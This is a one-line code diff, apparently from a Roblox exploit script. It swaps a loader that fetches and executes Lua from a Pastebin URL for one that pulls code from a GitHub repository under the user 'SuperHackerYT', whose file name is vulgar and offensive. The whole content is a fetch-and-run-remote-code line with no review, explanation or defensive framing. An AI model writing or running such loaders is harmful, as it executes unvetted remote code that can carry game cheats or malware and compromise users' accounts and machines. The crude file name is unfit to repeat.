@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/tQZYjYV0'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SuperHackerYT/skibidi/refs/heads/main/Diddyfucker.lua'))()
